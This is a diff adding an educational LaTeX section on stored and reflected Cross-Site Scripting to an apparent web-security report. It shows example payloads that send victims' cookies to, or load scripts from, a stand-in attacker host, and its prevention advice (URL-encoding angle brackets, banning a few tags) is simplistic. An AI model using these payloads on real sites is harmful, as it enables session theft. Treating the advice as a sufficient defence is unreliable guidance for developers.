@@ -422,6 +422,49 @@ This way, if an attacker will send \texttt{login' OR '1'='1} to the application,
 it will not cause any harm, because the query would literally try to find a user
 with name \texttt{login' OR '1'='1}.
 
+\subsection{Cross-Site Scripting (XSS)}
+
+\subsubsection{How it works}
+
+Cross-Site Scripting is closely related to injection as it works by injecting a
+malicious code to the application. There are two categories of this attack:
+stored and reflected. 
+
+The first one occurs when injected code is stored permanently on the server. An
+example could be a comment on a forum, which contains Javascript code. If the
+vulnerability is present, it will not be displayed on the page, but it will be
+executed. It could be simple like:
+
+\begin{minted}{js}
+<script>document.createElement('img').src = 'http://attackerswebsite.com/' +
+document.cookie</script>
+\end{minted}
+
+This script would create a HTTP request to attacker's website with the victim's
+cookies, which could contain for example very useful session token. It is also
+possible to include much bigger scripts with:
+
+\begin{minted}{js}
+<script src="http://attackerswebsite.com/evilscript.js"></script>
+\end{minted}
+
+Reflected attack works by reflecting the injected code off the trusted website.
+For example, an attacker might send an URL with malicious code to the victim,
+e.g:
+\texttt{http://website.com/<script\%20src="http://attackerswebsite.com/
+evilscript.js"></script>}. The URL itself is not dangerous, but the vulnerable
+website might show an error message containing the URL, thus embedding it and
+executing the injected script.
+
+\subsubsection{How to prevent it}
+
+To prevent XSS a few methods could be used. Some special characters like
+\texttt{<}, \texttt{>} could be URL encoded, in this case into \texttt{\%3C} and
+\texttt{\%3E}. This way all input will be displayed, but the script will not be
+executed. Another way would be to completely prohibit usage of
+\texttt{<script>}, \texttt{<link>} or \texttt{<iframe>} tags in HTML-enabled
+forms.
+
 \newpage
 
 \section{Conclusion}
